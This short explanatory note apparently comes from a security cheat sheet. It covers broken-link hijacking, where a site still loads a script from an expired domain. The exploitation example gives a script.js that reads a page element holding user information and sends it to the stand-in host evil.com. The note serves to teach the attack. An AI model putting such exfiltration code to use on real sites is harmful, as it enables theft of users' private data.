## Investigation

Assume that target website loads external JavaScript file in `example.com` no longer exists as below.

```bash
<script src="//example.com/script.js"></script>
```

If attacker bought this domain, he can host arbitrary JavaScript file named **`script.js`** in the `example.com` root directory.

<br />

## Exploitation Examples

Attacker can write arbitrary code for compromising users in **`script.js`** as example above.  
For example, if target website includes sensitive information of authenticated user in the page where the broken link is loaded, attackers can send these information to their owned server.

```jsx
// script.js
var secret = document.getElementById('userinfo');
var request = new XMLHttpRequest();
request.open('GET', 'http://evil.com/?data=' + secret, false);
request.send();
```
